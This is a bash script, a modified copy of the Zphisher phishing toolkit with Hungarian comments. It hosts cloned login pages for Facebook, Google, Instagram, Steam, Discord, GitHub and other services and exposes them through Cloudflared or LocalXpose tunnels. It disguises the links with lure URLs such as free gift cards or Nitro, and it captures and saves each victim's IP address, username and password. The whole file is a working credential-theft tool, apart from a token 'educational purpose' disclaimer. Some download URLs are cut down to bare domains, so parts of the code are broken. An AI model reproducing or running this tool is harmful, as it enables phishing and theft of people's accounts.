#!/bin/bash

# ==============================================================================
# ZPHISHER NATÍV FUTTATÁS (DOCKER NÉLKÜL) - 1. RÉSZ
# ==============================================================================
__version__="1.0"
HOST='127.0.0.1'
PORT='8080'

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

[[ ! -d ".server" ]] && mkdir -p ".server"
[[ ! -d "auth" ]] && mkdir -p "auth"

if [[ -d ".server/www" ]]; then
   rm -rf ".server/www"
   mkdir -p ".server/www"
else
   mkdir -p ".server/www"
fi

rm -rf ".server/.loclx" ".server/.cld.log" 2>/dev/null

## Script termination
exit_on_signal_SIGINT() {
   { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
   exit 0
}

exit_on_signal_SIGTERM() {
   { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
   exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
   tput sgr0 2>/dev/null
   tput op 2>/dev/null
   return
}

## Kill already running process
kill_pid() {
   check_PID="php cloudflared loclx"
   for process in ${check_PID}; do
       if pidof ${process} >/dev/null 2>&1; then 
           killall ${process} > /dev/null 2>&1 
       fi
   done
}

# Check for a newer release - UPDATE FÜGGVÉNY LETILTVA
check_update(){
   return 0
}

## Check Internet Status
check_status() {
   echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
   timeout 3s curl -fIs "https://github.com" > /dev/null
   [ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" || echo -e "${RED}Offline${WHITE}"
}

## Banner
banner() {
   cat <<- EOF
       ${ORANGE}  _____ __________.___  ___________             .__        
       ${ORANGE} /  _  \\______   \   | \__    ___/___    ____  |  |   ______
       ${ORANGE}/  /_\  \|     ___/   |   |    | /  _ \  /  _ \ |  |  /  ___/
       ${ORANGE}\____|__  /____|   |___|   |____| \____/ \____/|____/____  >
       ${ORANGE}        \/                                               \/
       ${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by API ${WHITE}
EOF
}

## Small Banner
banner_small() {
   cat <<- EOF
       ${ORANGE}  _____ __________.___  ___________             .__        
       ${ORANGE} /  _  \\______   \   | \__    ___/___    ____  |  |   ______
       ${ORANGE}/  /_\  \|     ___/   |   |    | /  _ \  /  _ \ |  |  /  ___/
       ${ORANGE}\____|__  /____|   |___|   |____| \____/ \____/|____/____  >
       ${ORANGE}        \/                                               \/
EOF
}
## Dependencies
dependencies() {
   echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
   if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
       echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
   else
       pkgs=(php curl unzip)
       for pkg in "${pkgs[@]}"; do
           type -p "$pkg" &>/dev/null || {
               echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
               if [[ $(command -v apt) ]]; then
                   sudo apt install "$pkg" -y
               elif [[ $(command -v apt-get) ]]; then
                   sudo apt-get install "$pkg" -y
               fi
           }
       done
   fi
}

# Download Binaries
download() {
   url="$1"
   output="$2"
   file=$(basename "$url")
   rm -rf "$file" "$output" 2>/dev/null
   curl --silent --insecure --fail --retry-connrefused --retry 3 --retry-delay 2 --location --output "${file}" "${url}"
   if [[ -e "$file" ]]; then
       if [[ ${file#*.} == "zip" ]]; then
           unzip -qq "$file" > /dev/null 2>&1
           mv -f "$output" .server/"$output" > /dev/null 2>&1
       elif [[ ${file#*.} == "tgz" ]]; then
           tar -zxf "$file" > /dev/null 2>&1
           mv -f "$output" .server/"$output" > /dev/null 2>&1
       else
           mv -f "$file" .server/"$output" > /dev/null 2>&1
       fi
       chmod +x .server/"$output" > /dev/null 2>&1
       rm -rf "$file"
   else
       echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
       exit 1
   fi
}

## Install Cloudflared
install_cloudflared() {
   if [[ -e ".server/cloudflared" ]]; then
       echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
   else
       echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
       arch=$(uname -m)
       if [[ "$arch" == *'aarch64'* ]]; then
           download 'https://github.com' 'cloudflared'
       elif [[ "$arch" == *'x86_64'* ]]; then
           download 'https://github.com' 'cloudflared'
       else
           download 'https://github.com' 'cloudflared'
       fi
   fi
}

## Install LocalXpose
install_localxpose() {
   if [[ -e ".server/loclx" ]]; then
       echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
   else
       echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
       arch=$(uname -m)
       if [[ "$arch" == *'aarch64'* ]]; then
           download 'https://localxpose.io' 'loclx'
       elif [[ "$arch" == *'x86_64'* ]]; then
           download 'https://localxpose.io' 'loclx'
       else
           download 'https://localxpose.io' 'loclx'
       fi
   fi
}

## Exit message
msg_exit() {
   { clear; banner; echo; }
   echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
   exit 0
}

## About
about() {
   { clear; banner; echo; }
   cat <<- EOF
       ${GREEN} Author   ${RED}:  ${ORANGE}API ${RED}[ ${ORANGE}APIk ${RED}]
       ${GREEN} Version  ${RED}:  ${ORANGE}${__version__}

       ${WHITE} ${REDBG}Warning:${RESETBG}
       ${CYAN}  This Tool is made for educational purpose
         only ${RED}!${WHITE}${CYAN} Author will not be responsible for
         any misuse of this toolkit ${RED}!${WHITE}
      
       ${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
EOF

   read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" REPLY
   case $REPLY in
       99) msg_exit;;
       0 | 00) echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."; sleep 1; main_menu;;
       *) echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."; sleep 1; about;;
   esac
}

## Choose custom port
cusport() {
   echo
   read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
   if [[ ${P_ANS} =~ ^([yY])$ ]]; then
       echo -e "\n"
       read -r -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
       if [[ -n ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
           PORT=${CU_P}
           echo
       else
           echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
           sleep 2; clear; banner_small; cusport
       fi     
   else
       echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
   fi
}

## Setup website and start php server
setup_site() {
   echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
   cp -rf .sites/"$website"/* .server/www
   cp -f .sites/ip.php .server/www/
   echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
   cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Get IP address
capture_ip() {
   IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
   echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
   echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
   cat .server/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_creds() {
   ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
   PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
   echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
   echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
   echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
   cat .server/www/usernames.txt >> auth/usernames.dat
   echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
   echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
   while true; do
       if [[ -e ".server/www/ip.txt" ]]; then
           echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
           capture_ip
           rm -rf .server/www/ip.txt
       fi
       sleep 0.75
       if [[ -e ".server/www/usernames.txt" ]]; then
           echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
           capture_creds
           rm -rf .server/www/usernames.txt
       fi
       sleep 0.75
   done
}
## Start Cloudflared
start_cloudflared() {
   rm -f .cld.log 2>/dev/null
   cusport
   echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
   setup_site
   echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
   .server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
   sleep 8
   cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
   custom_url "$cldflr_url"
   capture_data
}

localxpose_auth() {
   .server/loclx -help > /dev/null 2>&1 &
   sleep 1
   [ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"
   if .server/loclx account status 2>&1 | grep -q "Error"; then
       echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
       sleep 3
       read -r -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
       if [[ -z $loclx_token ]]; then
           echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
       else
           echo -n "$loclx_token" > "$auth_f" 2> /dev/null
       fi
   fi
}

## Start LocalXpose
start_loclx() {
   cusport
   echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
   setup_site
   localxpose_auth
   echo -e "\n"
   read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
   [[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
   echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
   .server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
   sleep 12
   loclx_url=$(grep -o '[0-9a-zA-Z.]*.loclx.io' .server/.loclx)
   custom_url "$loclx_url"
   capture_data
}

## Start localhost
start_localhost() {
   cusport
   echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
   setup_site
   clear; banner_small
   echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
   capture_data
}

## Tunnel selection
tunnel_menu() {
   clear; banner_small
   cat <<- EOF
       ${RED}[${WHITE}01${RED}]${ORANGE} Localhost
       ${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared 
EOF
   read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}" REPLY
   case $REPLY in
       1 | 01) start_localhost;;
       2 | 02) start_cloudflared;;
       *) echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."; sleep 1; tunnel_menu;;
   esac
}

## Custom Mask URL
custom_mask() {
   sleep .5; clear; banner_small; echo
   read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
   echo
   if [[ ${mask_op,,} == "y" ]]; then
       echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
       read -r -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url
       if [[ "$mask_url" == http* ]]; then
           mask=$mask_url
           echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
       else
           echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
       fi
   fi
}

## URL Shortner
site_stat() { [[ -n $1 ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }

shorten() {
   short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "https://shrtco.de")
   if [[ "$1" == *"shrtco.de"* ]]; then
       processed_url=$(echo "${short}" | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
   else
       processed_url=${short#http*//}
   fi
}

custom_url() {
   url=${1#http*//}
   isgd="https://is.gd"
   shortcode="https://shrtco.de"
   tinyurl="https://tinyurl.com"

   custom_mask; sleep 1; clear; banner_small
   if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
       if [[ $(site_stat $isgd) == 2* ]]; then
           shorten $isgd "$url"
       elif [[ $(site_stat $shortcode) == 2* ]]; then
           shorten $shortcode "$url"
       else
           shorten $tinyurl "$url"
       fi
       url="https://$url"
       masked_url="$mask@$processed_url"
       processed_url="https://$processed_url"
   else
       url="Unable to generate links. Try after turning on hotspot"
       processed_url="Unable to Short URL"
   fi

   echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
   echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
   [[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
}

site_facebook() {
   cat <<- EOF
       ${RED}[${WHITE}01${RED}]${ORANGE}  Login Page
EOF
   read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" REPLY
   case $REPLY in
       1 | 01) website="facebook"; mask='https://blue-verified-badge-for-facebook-free'; tunnel_menu;;
       *) echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."; sleep 1; clear; banner_small; site_facebook;;
   esac
}

site_instagram() {
   cat <<- EOF
       ${RED}[${WHITE}1${RED}]${ORANGE}  Login Page
EOF
   read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" REPLY
   case $REPLY in
       1 | 01) website="instagram"; mask='https://get-unlimited-followers-for-instagram'; tunnel_menu;;
       *) echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."; sleep 1; clear; banner_small; site_instagram;;
   esac
}

site_gmail() {
   cat <<- EOF
       ${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
EOF
   read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" REPLY
   case $REPLY in
       1 | 01) website="google"; mask='https://get-unlimited-google-drive-free'; tunnel_menu;;      
       *) echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."; sleep 1; clear; banner_small; site_gmail;;
   esac
}

main_menu() {
   clear; banner; echo
   cat <<EOF
${RED}[${WHITE}::${RED}]${ORANGE} Select An Option ${RED}[${WHITE}::${RED}]

${RED}[${WHITE}1${RED}]${ORANGE} Facebook
${RED}[${WHITE}2${RED}]${ORANGE} Instagram
${RED}[${WHITE}3${RED}]${ORANGE} Google
${RED}[${WHITE}4${RED}]${ORANGE} Microsoft
${RED}[${WHITE}5${RED}]${ORANGE} Netflix
${RED}[${WHITE}6${RED}]${ORANGE} WordPress
${RED}[${WHITE}7${RED}]${ORANGE} Steam
${RED}[${WHITE}8${RED}]${ORANGE} Twitter
${RED}[${WHITE}9${RED}]${ORANGE} PlayStation
${RED}[${WHITE}10${RED}]${ORANGE} TikTok
${RED}[${WHITE}11${RED}]${ORANGE} Twitch
${RED}[${WHITE}12${RED}]${ORANGE} Discord
${RED}[${WHITE}13${RED}]${ORANGE} Adobe
${RED}[${WHITE}14${RED}]${ORANGE} Reddit
${RED}[${WHITE}15${RED}]${ORANGE} Spotify
${RED}[${WHITE}16${RED}]${ORANGE} Proton Mail
${RED}[${WHITE}17${RED}]${ORANGE} Xbox
${RED}[${WHITE}18${RED}]${ORANGE} MediaFire
${RED}[${WHITE}19${RED}]${ORANGE} GitHub

${RED}[${WHITE}99${RED}]${ORANGE} About
${RED}[${WHITE}00${RED}]${ORANGE} Exit
EOF

   echo
   read -r -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option: ${BLUE}" REPLY
   case $REPLY in 
		0 | 00) msg_exit;;
		1) site_facebook;;
		2) site_instagram;;
		3) site_gmail;;
		4) website="microsoft"; mask='https://unlimited-onedrive-space-for-free'; tunnel_menu;;
		5) website="netflix"; mask='https://upgrade-your-netflix-plan-free'; tunnel_menu;;
		6) website="wordpress"; mask='https://unlimited-wordpress-traffic-free'; tunnel_menu;;
		7) website="steam"; mask='https://steam-500-usd-gift-card-free'; tunnel_menu;;
		8) website="twitter"; mask='https://get-blue-badge-on-twitter-free'; tunnel_menu;;
		9) website="playstation"; mask='https://playstation-500-usd-gift-card-free'; tunnel_menu;;
		10) website="tiktok"; mask='https://tiktok-free-liker'; tunnel_menu;;
		11) website="twitch"; mask='https://unlimited-twitch-tv-user-for-free'; tunnel_menu;;
		12) website="discord"; mask='https://get-discord-nitro-free'; tunnel_menu;;
		13) website="adobe"; mask='https://get-adobe-lifetime-pro-membership-free'; tunnel_menu;;
		14) website="reddit"; mask='https://reddit-official-verified-member-badge'; tunnel_menu;;
		15) website="spotify"; mask='https://convert-your-account-to-spotify-premium'; tunnel_menu;;
		16) website="protonmail"; mask='https://protonmail-pro-basics-for-free'; tunnel_menu;;
		17) website="xbox"; mask='https://get-500-usd-free-to-your-acount'; tunnel_menu;;
		18) website="mediafire"; mask='https://get-1TB-on-mediafire-free'; tunnel_menu;;
		19) website="github"; mask='https://get-1k-followers-on-github-free'; tunnel_menu;;
		99) about;;
		*) echo -e "${RED}[!] Érvénytelen opció${RESET}"; sleep 1; main_menu;;
   esac
}

## Execution path
kill_pid
dependencies
check_status
install_cloudflared
install_localxpose
main_menu
